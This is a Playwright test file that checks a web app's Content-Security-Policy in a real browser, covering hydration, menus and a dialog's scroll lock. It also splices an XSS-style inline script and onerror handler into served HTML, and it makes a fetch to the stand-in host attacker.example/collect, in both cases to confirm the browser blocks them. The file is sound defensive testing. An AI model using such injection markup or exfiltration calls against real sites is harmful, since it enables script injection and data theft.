import { viewports } from './env';
import { cspViolations, expect, messages, openApp, test } from './fixtures';

/**
 * The Content-Security-Policy enforced by a real browser (P1-08: "in-browser CSP violation check →
 * P1-13"). The unit and route tests prove the header and the nonces are there; this proves the
 * browser runs the app's own scripts under it, blocks injected ones, and that the UI primitives
 * that inject styles at runtime (Dialog's scroll lock, menus, toasts) stay inside the policy.
 */

test.describe('the app stays inside its policy', () => {
  test.use({ viewport: viewports.desktop });

  test('pages hydrate, and menus open, with no violation', async ({ page }) => {
    const t = messages('en');
    await page.goto('/en');
    // Next's nonce'd inline bootstrap ran (the flight data queue exists) and React hydrated:
    // the theme menu is interactive.
    expect(
      await page.evaluate(() => Array.isArray((self as { __next_f?: unknown }).__next_f)),
    ).toBe(true);
    await page.getByRole('button', { name: new RegExp(`^${t.theme!.label!}`) }).click();
    await expect(page.getByRole('menu')).toBeVisible();
    await page.getByRole('menuitemradio', { name: t.theme!.dark! }).click();
    await expect(page.locator('html')).toHaveAttribute('data-theme', 'dark');
    // The automatic guard then asserts: no CSP violation, no console error.
  });
});

test.describe('the "More" sheet', () => {
  test.use({ viewport: viewports.phone });

  test("opens (scroll lock injects a nonce'd style) with no violation", async ({ page }) => {
    await openApp(page, '/fa/overview');
    await page.getByRole('button', { name: messages('fa').nav!.more! }).click();
    await expect(page.getByRole('dialog')).toBeVisible();
    await page.keyboard.press('Escape');
    await expect(page.getByRole('dialog')).toBeHidden();
  });
});

test.describe('injected content is blocked', () => {
  test.use({ allowPageErrors: true });

  test('an inline script and an inline event handler without the nonce never run', async ({
    page,
  }) => {
    // Simulates an HTML injection: the real server response (with its real CSP header) plus
    // markup the app never emits.
    await page.route('**/en/overview', async (route) => {
      const response = await route.fetch();
      const html = (await response.text()).replace(
        '</body>',
        '<script>window.__injected = "script"</script>' +
          '<img src="/__missing.png" onerror="window.__injected = \'handler\'">' +
          '</body>',
      );
      await route.fulfill({ response, body: html });
    });
    await page.goto('/en/overview');
    // The server HTML is enough here (the injected markup can break hydration on purpose).
    await expect(page.getByRole('main')).toBeVisible();

    await expect.poll(async () => (await cspViolations(page)).length).toBeGreaterThanOrEqual(2);
    expect(
      await page.evaluate(() => (window as { __injected?: string }).__injected),
    ).toBeUndefined();
    const directives = (await cspViolations(page)).map((v) => v.directive);
    expect(directives).toContain('script-src-elem');
    expect(directives).toContain('script-src-attr');
  });

  test('a fetch to a foreign origin is refused by connect-src', async ({ page }) => {
    await page.goto('/en');
    const outcome = await page.evaluate(() =>
      fetch('https://attacker.example/collect').then(
        () => 'sent',
        () => 'blocked',
      ),
    );
    expect(outcome).toBe('blocked');
    const violations = await cspViolations(page);
    expect(violations).toContainEqual(
      expect.objectContaining({
        directive: 'connect-src',
        blockedURI: 'https://attacker.example/collect',
      }),
    );
  });
});
